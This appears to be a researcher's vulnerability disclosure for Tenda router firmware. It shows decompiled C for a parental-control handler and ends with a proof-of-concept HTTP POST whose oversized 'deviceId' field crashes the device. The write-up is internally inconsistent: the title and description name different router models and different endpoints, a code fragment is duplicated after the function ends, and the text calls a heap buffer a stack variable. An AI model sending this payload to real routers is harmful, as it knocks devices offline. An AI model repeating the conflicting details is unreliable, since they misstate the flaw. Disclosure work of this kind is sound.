# Tenda AC15 v1 was discovered stack overflow via parameter 'deviceId' at url /goform/SetNetControlList

## Affected version

US_AC15V1.0BR_V15.03.05.19_multi_TD01

## Firmware download address

[AC15升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/download/detail-2680.html)

## Vulnerability Description

Tenda AC10 v4 US_AC10V4.0si_V16.03.10.13_cn was discovered to contain a stack overflow via parameter 'deviceId' at url /goform/saveParentControlInfo.

## vulnerability Details

1. This vulnerability lies in the `/goform/saveParentControlInfo` page，The details are shown below:

```c
int __fastcall saveParentControlInfo(int a1)
{
  int v2; // r0
  bool v3; // r3
  bool v4; // r3
  bool v5; // r3
  int v6; // r0
  int s2[8]; // [sp+28h] [bp-3D4h] BYREF
  int s1[8]; // [sp+48h] [bp-3B4h] BYREF
  int v10; // [sp+68h] [bp-394h] BYREF
  char v11[128]; // [sp+6Ch] [bp-390h] BYREF
  _DWORD v12[30]; // [sp+ECh] [bp-310h] BYREF
  int v13; // [sp+164h] [bp-298h] BYREF
  __int16 v14; // [sp+168h] [bp-294h] BYREF
  unsigned __int8 v15; // [sp+16Ah] [bp-292h] BYREF
  char v16[576]; // [sp+16Ch] [bp-290h] BYREF
  void *v17; // [sp+3ACh] [bp-50h]
  void *ptr; // [sp+3B0h] [bp-4Ch]
  _BYTE *v19; // [sp+3B4h] [bp-48h]
  char *v20; // [sp+3B8h] [bp-44h]
  void *v21; // [sp+3BCh] [bp-40h]
  _BYTE *v22; // [sp+3C0h] [bp-3Ch]
  char *v23; // [sp+3C4h] [bp-38h]
  char *v24; // [sp+3C8h] [bp-34h]
  char *v25; // [sp+3CCh] [bp-30h]
  char *nptr; // [sp+3D0h] [bp-2Ch]
  char *v27; // [sp+3D4h] [bp-28h]
  char *src; // [sp+3D8h] [bp-24h]
  int v29; // [sp+3DCh] [bp-20h]
  int v30; // [sp+3E0h] [bp-1Ch]
  int id_list; // [sp+3E4h] [bp-18h]
  int v32; // [sp+3E8h] [bp-14h]
  int i; // [sp+3ECh] [bp-10h]

  memset(v16, 0, sizeof(v16));
  v13 = 0;
  v14 = 0;
  v15 = 0;
  v32 = 0;
  id_list = 0;
  i = 0;
  memset(v12, 0, sizeof(v12));
  memset(v11, 0, sizeof(v11));
  v30 = 0;
  v10 = 0;
  v29 = 0;
  src = (char *)websGetVar(a1, (int)"deviceId", (int)&unk_EDD28);
  v27 = (char *)websGetVar(a1, (int)"enable", (int)&unk_EDD28);
  nptr = (char *)websGetVar(a1, (int)"time", (int)&unk_EDD28);
  v25 = (char *)websGetVar(a1, (int)"url_enable", (int)&unk_EDD28);
  v24 = (char *)websGetVar(a1, (int)"urls", (int)&unk_EDD28);
  v23 = (char *)websGetVar(a1, (int)"day", (int)&unk_EDD28);
  v22 = websGetVar(a1, (int)"block", (int)&unk_EDD28);
  v21 = websGetVar(a1, (int)"connectType", (int)&unk_EDD28);
  v20 = (char *)websGetVar(a1, (int)"limit_type", (int)"1");
  v19 = websGetVar(a1, (int)"deviceName", (int)&unk_EDD28);
  if ( *v19 )
    sub_C6D58(v19, src);
  if ( *nptr )
  {
    memset(s1, 0, sizeof(s1));
    memset(s2, 0, sizeof(s2));
    sscanf(nptr, "%[^-]-%s", s1, s2);
    if ( !strcmp((const char *)s1, (const char *)s2) )
    {
      sub_2C40C(
        a1,
        "HTTP/1.1 200 OK\nContent-type: text/plain; charset=utf-8\nPragma: no-cache\nCache-Control: no-cache\n\n");
      sub_2C40C(a1, "{\"errCode\":%d}", 1);
      return sub_2C954(a1, 200);
    }
  }
  ptr = malloc(0x254u);
  memset(ptr, 0, 0x254u);
  strcpy((char *)ptr + 2, src);
  v17 = malloc(0x254u);
  memset(v17, 0, 0x254u);
  SetValue("parent.global.en", "1");
  SetValue("filter.url.en", "1");
  SetValue("filter.mac.en", "1");
  strcpy((char *)v17 + 2, src);
  strcpy((char *)v17 + 34, nptr);
  sscanf(
    v23,
    "%d,%d,%d,%d,%d,%d,%d",
    &v13,
    (char *)&v13 + 1,
    (char *)&v13 + 2,
    (char *)&v13 + 3,
    &v14,
    (char *)&v14 + 1,
    &v15);
  if ( !(_BYTE)v13
    && __PAIR16__(BYTE1(v13), 0) == BYTE2(v13)
    && __PAIR16__(HIBYTE(v13), 0) == (unsigned __int8)v14
    && __PAIR16__(HIBYTE(v14), 0) == v15
    && !*v22 )
  {
    for ( i = 0; i <= 6; ++i )
      *((_BYTE *)v17 + i + 66) = 1;
  }
  else
  {
    for ( i = 0; i <= 6; ++i )
      *((_BYTE *)v17 + i + 66) = *((_BYTE *)&v13 + i) != 0;
  }
  v2 = atoi(nptr);
  *((_DWORD *)v17 + 19) = v2;
  strcpy((char *)v17 + 80, v24);
  v3 = atoi(v25) != 0;
  *((_BYTE *)v17 + 592) = v3;
  v4 = atoi(v27) != 0;
  *(_BYTE *)v17 = v4;
  *((_BYTE *)v17 + 1) = 0;
  v5 = atoi(v20) != 0;
  *((_BYTE *)v17 + 593) = v5;
  v32 = sub_83678(0, &v10, ptr);
  if ( v32 <= 0 )
  {
    id_list = bm_get_id_list("parent.control.id", v12, 30);
    if ( id_list )
    {
      if ( id_list > 29 )
      {
        free(ptr);
        free(v17);
        sub_2C40C(
          a1,
          "HTTP/1.1 200 OK\nContent-type: text/plain; charset=utf-8\nPragma: no-cache\nCache-Control: no-cache\n\n");
        sub_2C40C(a1, "{\"errCode\":%d}", 1);
        return sub_2C954(a1, 200);
      }
      for ( i = 0; i != 30; ++i )
      {
        if ( !v12[i] )
        {
          v10 = i + 1;
          break;
        }
      }
      GetValue((int)"parent.control.id", (int)v16);
      sprintf(v11, "%s,%d", v16, v10);
      SetValue("parent.control.id", v11);
      sub_83FB4(v32, v10, v17);
    }
    else
    {
      SetValue("parent.control.id", "1");
      v10 = 1;
      sub_83FB4(v32, 1, v17);
    }
  }
  else
  {
    if ( !memcmp(ptr, v17, 0x254u) )
    {
      free(ptr);
      free(v17);
      sub_2C40C(
        a1,
        "HTTP/1.1 200 OK\nContent-type: text/plain; charset=utf-8\nPragma: no-cache\nCache-Control: no-cache\n\n");
      sub_2C40C(a1, "{\"errCode\":%d}", 0);
      return sub_2C954(a1, 200);
    }
    sub_83FB4(v32, v10, v17);
  }
  free(ptr);
  free(v17);
  CommitCfm(v6);
  send_msg_to_netctrl(9, (int)"op=5");
  send_msg_to_netctrl(7, (int)"op=5");
  send_msg_to_netctrl(14, (int)"op=5");
  sub_2C40C(
    a1,
    "HTTP/1.1 200 OK\nContent-type: text/plain; charset=utf-8\nPragma: no-cache\nCache-Control: no-cache\n\n");
  sub_2C40C(a1, "{\"errCode\":%d}", 0);
  return sub_2C954(a1, 200);
}P/1.1 200 OK\nContent-type: text/plain; charset=utf-8\nPragma: no-cache\nCache-Control: no-cache\n\n");
  sub_2C40C(a1, "{\"errCode\":%d}", 0);
  return sub_2C954(a1, 200);
}
```

2. in function  saveParentControlInfo, 'src' is a a user-controlled parameter("deviceId") and is read in without length check.

![](C:\Users\tian\AppData\Roaming\marktext\images\2023-07-18-20-07-35-image.png)

3. Then src's content is copied into local variable 'v17', which leads to a stack overflow vulnerbility.

![](C:\Users\tian\AppData\Roaming\marktext\images\2023-07-18-20-10-23-image.png)

## POC

By sending delicately constructed data package as the poc above, we can cause a stack overflow error.

```
POST /goform/saveParentControlInfo HTTP/1.1
Host: 192.168.204.143
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user=admin
Connection: close
Content-Length: 4106

deviceId=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaa
```

## Author

田文奇


